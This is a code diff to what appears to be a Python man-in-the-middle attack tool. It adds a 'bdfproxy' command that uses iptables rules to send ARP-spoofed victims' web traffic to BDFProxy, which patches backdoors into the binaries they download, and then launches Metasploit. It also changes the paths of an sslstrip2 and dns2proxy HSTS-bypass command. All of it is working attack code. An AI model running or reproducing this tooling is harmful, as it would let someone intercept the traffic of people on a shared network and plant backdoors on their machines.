@@ -67,7 +67,7 @@ class Processor(object):
 		self.teardrop_status = 0
 		self.sslstrip_status = False
 		self.dns2proxy_status = False
-
+		self.bdfproxy_status = False
 
 		# Recursive "shell=True" process killing
 	def pskill(self, proc_pid):
@@ -113,6 +113,35 @@ class Processor(object):
 							set_ip_forwarding(0)
 						exit()
 
+					elif self.command == "bdfproxy":
+						if self.dns2proxy_status == True or self.sslstrip_status == True:
+							print "[!] BDFProxy can't run with hstsbypass."
+							continue
+						if self.arpspoof_status:
+							try:
+								os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")
+								os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080")
+								with open("{}/log/bdfproxy.log".format(self.path), "a+") as stdout:
+									self.p1 = subprocess.Popen(["python {}/third-party/BDFProxy/bdf_proxy.py".format(self.path),"bdfproxy"],shell=True, stdout=stdout, stderr=stdout)
+								print "[+] BDFProxy initialized"
+								print "	 |_by: Joshua Pitts"
+								self.bdfproxy_status = True
+								print "[*] Starting Metasploit."
+								print "		|_by: rapid7"
+								os.system("service postgresql start")
+								os.system("msfdb init")
+								os.system("msfconsole bdfproxy_msf_resource.rc")
+							except Exception as e:
+								print "[!] Exception caught: {}".format(e)
+						else:
+							print "[!] You need to start an ARP spoof attack first."
+					elif self.command == "bdfproxy help":
+						print "\n[Help] Start to patch backdoors inside binary downloads while man-in-the-middleing with BDFProxy + Metasploit combo."
+						print "[Required] ARP spoofing started."
+						print "example:"
+						print "{} arpspoof start".format(console)
+						print "{} bdfproxy\n".format(console)
+
 
 						# HSTSBYPASS
 					elif self.command == "hstsbypass":
@@ -127,10 +156,10 @@ class Processor(object):
 
 								#Start subprocess with shell=True with sslstrip2 and dns2proxy
 					               	       	with open("{}/log/sslstrip.log".format(self.path), "a+") as stdout:
-        	                       					self.p1 = subprocess.Popen(["python {}/sslstrip2/sslstrip.py -l 8000".format(self.path),"sslstrip"], shell=True, stdout=stdout, stderr=stdout)
+        	                       					self.p1 = subprocess.Popen(["python {}/third-party/sslstrip2/sslstrip.py -l 8000".format(self.path),"sslstrip"], shell=True, stdout=stdout, stderr=stdout)
 									self.sslstrip_status = True
 								with open("{}/log/dns2proxy.log".format(self.path),"a+") as stdout:
-									self.p2 = subprocess.Popen(["python {}/dns2proxy/dns2proxy.py".format(self.path),"dns2proxy"], shell=True, stdout=stdout, stderr=stdout)
+									self.p2 = subprocess.Popen(["python {}/third-party/dns2proxy/dns2proxy.py".format(self.path),"dns2proxy"], shell=True, stdout=stdout, stderr=stdout)
 									self.dns2proxy_status = True
 								print "[*] SSLstrip+ initialized"
 								print "      |_by: LeonardoNve && M.Marlinspike"
@@ -146,6 +175,7 @@ class Processor(object):
 						print "\n[Help] Start to perform a HSTS Bypass with dns2proxy and SSL strip with sslstrip+"
 						print "[Required] ARP spoofing started."
 						print "example:"
+						print "{} arpspoof start".format(console)
 						print "{} hstsbypass\n".format(console)
 
 
